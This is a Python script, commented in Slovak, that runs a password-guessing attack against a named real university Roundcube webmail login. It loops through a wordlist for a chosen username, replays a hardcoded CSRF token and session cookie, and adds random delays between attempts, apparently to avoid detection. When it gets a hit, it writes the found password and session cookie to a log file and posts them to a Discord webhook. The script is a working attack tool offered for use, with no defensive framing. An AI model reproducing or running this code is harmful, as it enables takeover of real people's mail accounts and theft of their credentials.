import requests
import sys
import time
import random

username = input("[*] Zadaj username alebo email: ")  

url = "https://studentmail.ukf.sk/webmail/"           
discord_webhook = ""                  # webhook URL pre Discord notifikacie

wordlist = "modules/passwords.txt"  # uprav podla svojej cesty

try:
    with open(wordlist, "r", encoding="utf-8") as f:
        # odstrani prazdne riadky a medzery
        payloads = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print(f"[-] Error: wordlist nebol najdeny: {wordlist!r}", file=sys.stderr)
    sys.exit(1)

cookies = {"roundcube_sessid": "i9csl5ad1uuccoprmd8pbt7gj1"}

# Funkcia pre odoslanie spravy na Discord 
def notify_discord(message):
    try:
        requests.post(discord_webhook, json={"content": message})
    except Exception as e:
        print(f"Chyba pri odosielani na Discord: {e}")

# Funkcia, ktora posiela POST request pre login, potrebne ponechat aj action, timezone, url, inak nepride k loginu
def try_login(user, password): 
    data = {
        "_token": "3a1253627569db928fb76c9b8aba18c5",
        "_action": "login",
        "_timezone": "-4",
        "_url": "",
        "_user": user,
        "_pass": password
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }
    # posle request bez sledovania redirectu (allow_redirects=False)
    resp = requests.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False, timeout=10)
    return resp

# Hlavny loop, ktory testuje hesla zo zoznamu 
for pw in payloads:
    resp = try_login(username, pw)
    
    # kontrola uspechu: 302 redirect + cookie roundcube_sessid
    sess_cookie = resp.cookies.get("roundcube_sessid")
    if resp.status_code == 302 and sess_cookie:
        msg = f"[FOUND] Username: {username} | Password: {pw} | Session cookie: {sess_cookie}"
        print(msg)           
        notify_discord(msg)
        with open("modules/logs/log_found_webmail.txt", "a", encoding="utf-8") as logfile:
            logfile.write(msg + "\n")  
        break                
    else:
        print(f"[FAIL] {pw} | status: {resp.status_code}")  
    
    time.sleep(random.uniform(0.8, 1.5))  # Pauza medzi 0.8 a 1.5 sekundy
